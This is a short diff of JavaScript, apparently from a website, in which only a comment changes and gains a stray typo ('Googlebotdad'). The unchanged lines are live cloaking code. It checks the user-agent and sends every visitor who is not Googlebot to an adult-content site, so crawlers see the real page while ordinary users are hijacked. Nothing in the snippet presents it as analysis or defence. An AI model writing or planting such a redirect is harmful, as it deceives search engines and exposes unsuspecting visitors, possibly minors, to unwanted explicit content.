@@ -1,4 +1,4 @@
-// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebotdad)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
   window.location.href = "https://livesexvideo.pages.dev";
